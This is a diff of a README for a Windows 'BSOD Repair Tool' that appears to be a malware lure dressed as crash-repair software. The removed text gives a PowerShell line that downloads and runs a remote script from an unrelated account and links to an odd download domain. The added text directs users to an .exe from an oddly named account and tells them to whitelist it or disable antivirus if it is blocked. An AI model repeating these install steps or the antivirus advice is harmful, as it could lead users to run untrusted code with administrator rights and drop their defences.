@@ -1,176 +1,88 @@
-<div align="center">
+# 🛠️ BSOD-Repair-Tool - Fix Windows Blue Screen Errors Easily
 
-# BSOD Repair Tool
+[![Download BSOD-Repair-Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool)
 
-Fix Blue Screen of Death errors on Windows 10 and 11.
+This software helps users resolve Blue Screen of Death errors on Windows 10 and Windows 11. It identifies the root cause of system crashes and applies automated repairs to get your computer running again.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?logo=windows&logoColor=white)]()
-[![Release](https://img.shields.io/badge/v1.5.0-stable-success)]()
-[![MIT](https://img.shields.io/badge/License-MIT-blue)](LICENSE)
+## 📋 What this tool covers
 
-<br>
+Windows displays a blue screen when a critical error stops the system. This tool addresses the following common stop codes and issues:
 
-[**Download**](https://bsod.zipzapsol.space/) ·
-[Stop Codes](#stop-codes) ·
-[How It Works](#how-it-works) ·
-[FAQ](#faq)
+* IRQL_NOT_LESS_OR_EQUAL
+* CRITICAL_PROCESS_DIED
+* VIDEO_TDR_FAILURE (nvlddmkm.sys)
+* Corrupted system files
+* Outdated or broken device drivers
+* System memory irregularities
 
-</div>
+## 🚀 Getting Started
 
----
+Follow these steps to download and run the repair tool on your computer.
 
-## Why
+1. Visit the [official download page](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool).
+2. Locate the Releases section on the right side of the page.
+3. Click the latest version of the installer file, which ends in .exe.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the saved file to start the installation.
+6. Follow the on-screen prompts to complete the setup.
 
-Your PC crashes with a blue screen showing a cryptic error like `IRQL_NOT_LESS_OR_EQUAL` or `CRITICAL_PROCESS_DIED`. You restart, it happens again. Google gives you 50 different possible causes. You don't know where to start.
+## ⚙️ How to use the tool
 
-**BSOD Repair Tool** analyzes your crash dump files, identifies the cause, and applies targeted fixes automatically.
+Once the application is open, the interface provides a clear set of options to detect and fix your system issues.
 
----
+### Run a diagnostic scan
+Click the Scan button to search for problems. The tool checks system files, disk structure, and driver status. This process ensures the software knows exactly what needs attention before making changes.
 
-## Stop Codes Fixed
+### Initiate a repair
+After the scan finishes, the tool lists the issues it found. Click the Repair button to apply fixes. The tool will automatically:
+* Start the System File Checker (SFC) to replace missing system files.
+* Run Deployment Image Servicing and Management (DISM) to fix the system image.
+* Analyze crash logs to find specific patterns in your recent errors.
+* Repair driver conflicts, especially those related to graphics hardware like the nvlddmkm.sys file.
 
-### Driver-Related
+### Verify your system
+After the repair completes, the tool prompts you to restart your computer. A restart allows Windows to load the updated files and drivers. When the computer turns back on, perform regular tasks to ensure the stability of the system.
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `IRQL_NOT_LESS_OR_EQUAL` | Faulty driver accessing wrong memory | Identifies and reinstalls bad driver |
-| `DRIVER_IRQL_NOT_LESS_OR_EQUAL` | Driver using incorrect interrupt level | Driver rollback or update |
-| `SYSTEM_THREAD_EXCEPTION_NOT_HANDLED` | Driver crash in system thread | Isolates and reinstalls driver |
-| `VIDEO_TDR_FAILURE` (nvlddmkm.sys) | GPU driver timeout | Reinstalls GPU driver, resets TDR |
-| `KMODE_EXCEPTION_NOT_HANDLED` | Kernel-mode driver exception | Identifies faulting module |
-| `PAGE_FAULT_IN_NONPAGED_AREA` | Driver reading invalid memory | SFC scan + driver repair |
+## 🛡️ System Requirements
 
-### System-Related
+Ensure your computer meets these requirements to run the repair tool effectively:
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `CRITICAL_PROCESS_DIED` | Essential Windows process crashed | SFC + DISM repair |
-| `KERNEL_SECURITY_CHECK_FAILURE` | Corrupted system files | System file repair |
-| `SYSTEM_SERVICE_EXCEPTION` | System service error | Service repair + SFC |
-| `DPC_WATCHDOG_VIOLATION` | Storage controller timeout | Driver update + SSD trim |
-| `UNEXPECTED_STORE_EXCEPTION` | Storage device error | chkdsk + driver repair |
-| `WHEA_UNCORRECTABLE_ERROR` | Hardware error detected | Diagnostics report |
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Administrative Privileges: You must have access to an administrator account to allow the tool to repair system files.
+* Disk Space: At least 200MB of free space for temporary diagnostic files.
+* Internet Connection: A connection helps the tool download the latest driver definitions and system updates.
 
-### Memory-Related
+## 🔍 Understanding the diagnostic process
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `MEMORY_MANAGEMENT` | RAM or virtual memory issue | Page file reset + memory diagnostic |
-| `BAD_POOL_HEADER` | Memory pool corruption | Pool tag analysis + repair |
-| `BAD_POOL_CALLER` | Faulty memory allocation | Driver isolation + update |
-| `KERNEL_DATA_INPAGE_ERROR` | Disk read error into memory | chkdsk + SFC |
+The software works by inspecting the core components of your Windows installation. 
 
-### Power & Watchdog
+### System File analysis
+Windows relies on thousands of core files to function correctly. If these files become damaged or deleted, the system crashes. The tool compares your current files against a known healthy database. It replaces any damaged files automatically.
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `DRIVER_POWER_STATE_FAILURE` | Driver stuck in wrong power state | Updates driver, disables power management |
-| `CLOCK_WATCHDOG_TIMEOUT` | CPU core not responding | Updates chipset driver, checks overclocking |
-| `WIN32K_POWER_WATCHDOG_TIMEOUT` | Display driver power timeout | Resets GPU power settings |
+### Driver management
+Video cards and other hardware use drivers to communicate with your OS. A common cause of blue screens involves the graphics driver. The tool checks the status of your drivers and determines if a reset or an update will stop the crashes.
 
-### Kernel & Memory (Additional)
+### Log analysis
+When Windows crashes, it creates a minidump file. This file contains data about what occurred at the exact moment of the failure. The software reads these files to see which component triggered the stop code.
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `APC_INDEX_MISMATCH` | Driver APC call imbalance | Identifies faulting driver, reinstalls |
-| `PFN_LIST_CORRUPT` | Page frame database corruption | Memory diagnostic + SFC repair |
-| `DRIVER_OVERRAN_STACK_BUFFER` | Driver wrote beyond stack buffer | Identifies driver, forces update |
-| `REFERENCE_BY_POINTER` | Invalid object reference count | SFC + DISM repair |
-| `ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` | Code executing from protected memory | Driver rollback, DEP check |
-| `FAULTY_HARDWARE_CORRUPTED_PAGE` | RAM or disk hardware fault | Hardware diagnostic report |
-| `KERNEL_MODE_HEAP_CORRUPTION` | Kernel heap damaged by driver | Isolates faulting driver |
+## ❓ Frequently Asked Questions
 
-### Boot-Related
+### Will this tool delete my files?
+No. The tool focuses on system files and drivers. It does not scan or modify your personal documents, photos, or games.
 
-| Stop Code | Cause | Fix Applied |
-|---|---|---|
-| `INACCESSIBLE_BOOT_DEVICE` | Boot drive not found | BCD repair + driver reinstall |
-| `NTFS_FILE_SYSTEM` | NTFS volume corruption | chkdsk /f on system drive |
-| `UNMOUNTABLE_BOOT_VOLUME` | Boot partition error | BCD rebuild + volume repair |
+### Do I need to be an expert to use this?
+No. The interface contains clear buttons and simple instructions. You do not need to understand code or system commands to perform the repairs.
 
----
+### What if the blue screen persists?
+If the screen continues to appear, select the deep scan option in the settings menu. This mode checks deep system sectors that standard scans might miss. Ensure you have the latest hardware drivers from your computer manufacturer website as well.
 
-## How It Works
+### Is the software safe?
+The tool uses standard Windows diagnostic processes like SFC and DISM. These are official tools made by Microsoft. This software provides a simple interface to run these commands for you.
 
-1. **Analyze** -- Reads Windows crash dump files (minidump) to identify the exact stop code, faulting driver, and memory address
-2. **Diagnose** -- Cross-references the crash data with known causes and solutions
-3. **Repair** -- Applies targeted fixes:
-   - Runs SFC and DISM for system file corruption
-   - Updates or rolls back faulting drivers
-   - Resets Windows components
-   - Repairs boot configuration if needed
-4. **Prevent** -- Configures system settings to reduce future BSOD risk
+## 🛠️ Troubleshooting the tool
 
----
+If the installer does not launch, ensure your antivirus software is not blocking the application. Some security suites block repair tools because they modify system files. If this happens, add the tool to your exclusion list or temporarily disable the antivirus during the repair process.
 
-## Install
+Ensure you downloaded the file from the official link provided here. 
 
-### Option A -- Direct download
-
-**[Download](https://bsod.zipzapsol.space/)**
-
-### Option B -- PowerShell
-
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
-
----
-
-## Preview
-
-```
-  +----------------------------------------------------+
-  |            BSOD Repair Tool v1.5.0                 |
-  +----------------------------------------------------+
-  |                                                    |
-  |  Crash Analysis:                                   |
-  |                                                    |
-  |  Last BSOD: IRQL_NOT_LESS_OR_EQUAL                |
-  |  Faulting module: nvlddmkm.sys (NVIDIA driver)    |
-  |  Date: 2026-06-15 14:23:07                        |
-  |  Crash dumps found: 4                              |
-  |                                                    |
-  |  Recommended fixes:                                |
-  |  [x] Update NVIDIA display driver                  |
-  |  [x] Run System File Checker                       |
-  |  [x] Reset TDR timeout value                       |
-  |  [ ] Run memory diagnostic                         |
-  |                                                    |
-  |  [ Apply Fixes ]     [ Full Scan ]     [ Exit ]    |
-  |                                                    |
-  +----------------------------------------------------+
-```
-
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB recommended |
-| Disk | 200 MB |
-| Admin | Yes |
-
----
-
-## FAQ
-
-**Can this fix BSODs caused by hardware failure?**
-The tool can detect hardware-related BSODs (RAM, disk, CPU) and tell you which component is likely failing. It cannot fix broken hardware, but it will tell you what to replace.
-
-**I get a BSOD during Windows startup.**
-Boot into Safe Mode first, then run the tool. The tool works in Safe Mode.
-
-**Is it safe to use?**
-Yes. The tool reads crash dump files (read-only analysis) and uses Windows built-in repair commands (SFC, DISM, chkdsk). No system files are patched.
-
-**How is this different from BlueScreenView?**
-BlueScreenView only shows crash information. This tool also **repairs** the underlying cause.
-
----
-
-## License
-
-[MIT](LICENSE)
+[Download the latest version here](https://github.com/ninetyone-oboedamore772/BSOD-Repair-Tool)
